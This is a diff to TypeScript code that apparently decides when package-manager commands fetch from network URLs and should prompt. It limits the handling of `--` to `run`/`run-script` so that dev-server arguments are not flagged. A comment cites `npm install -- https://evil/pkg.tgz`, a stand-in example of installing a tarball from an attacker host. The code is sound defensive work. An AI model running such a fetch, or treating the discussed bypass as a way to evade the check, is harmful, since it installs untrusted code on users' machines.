@@ -122,6 +122,13 @@ const WRAPPERS: ReadonlySet<string> = new Set([
   'env',
 ]);
 
+/**
+ * Package-manager subcommands whose `--` hands the rest of the argv to a SCRIPT rather than to the
+ * package manager. Deliberately just these two: for every other subcommand `--` is an ordinary
+ * end-of-options marker and the operands after it are still the package manager's own.
+ */
+const RUN_SUBCOMMANDS: ReadonlySet<string> = new Set(['run', 'run-script']);
+
 /** A leading `VAR=value` assignment, which precedes the real head exactly like a wrapper does. */
 const ENV_ASSIGNMENT_RE = /^[A-Za-z_][A-Za-z0-9_]*=/;
 
@@ -459,7 +466,33 @@ function candidatesFor(
         );
       }
       break;
-    case 'flag':
+    case 'flag': {
+      // `<pm> run <script> -- …` hands everything after the `--` to the SCRIPT: the package manager
+      // stops parsing there and never sees those tokens, so nothing after it is a package-manager
+      // fetch position. Without this, `npm run dev -- --proxy https://api.example.com` and
+      // `npm run build -- --url <URL>` — ordinary dev-server invocations — prompted every time.
+      //
+      // **Scoped to `run`/`run-script` on purpose, and that scope is the whole safety of it.** `--`
+      // is an end-of-options marker for the OTHER subcommands, where the operands after it are still
+      // the package manager's own: `npm install -- https://evil/pkg.tgz` installs that tarball, and
+      // it must keep flooring. A blanket "ignore everything after `--`" would be an evasion.
+      //
+      // The residual, stated so it is a decision: a project script that forwards its arguments to a
+      // network tool (`"build": "curl"`) would fetch a post-`--` URL. That is not a package-manager
+      // fetch, it is indistinguishable from the same script with the URL hardcoded — which
+      // `npm run build` alone already is, silently — and reaching it requires a script that already
+      // exists in package.json.
+      const scriptArgs = RUN_SUBCOMMANDS.has(positional[0] ?? '') ? operands.indexOf('--') : -1;
+      const own = scriptArgs === -1 ? operands : operands.slice(0, scriptArgs);
+      const ownPositional = own.filter((operand) => !operand.startsWith('-'));
+
+      // The registry/index OVERRIDE is exempt from that boundary, and deliberately so: it is scanned
+      // across the whole argv. A first cut honoured the boundary here too, and no mutation could kill
+      // it — nothing observable changed, because the flags this arm knows (`--registry`,
+      // `--index-url`, `-i`) are not the flags the false positive was about (`--url`, `--proxy`,
+      // `--host`, which no package manager parses). Scanning everything is the raise-only choice and
+      // the one without an untestable branch: `npm run build -- --registry <URL>` floors, which is an
+      // over-match rather than a miss.
       for (let i = 0; i < operands.length; i++) {
         // Both spellings: `--registry=URL` and `--registry URL`.
         const [flag, inlineValue] = operands[i].split(/=(.*)/);
@@ -473,12 +506,13 @@ function candidatesFor(
       // `npm install typescript@latest` and `npm install lodash@4.17.21` as `user@host` and prompt
       // on two of the most ordinary commands there are.
       candidates.push(
-        ...[...positional, ...inline].map((value) => ({
+        ...[...ownPositional, ...inlineFlagValues(own)].map((value) => ({
           value,
           test: (operand: string) => SCHEME_RE.test(operand),
         }))
       );
       break;
+    }
   }
   return candidates;
 }
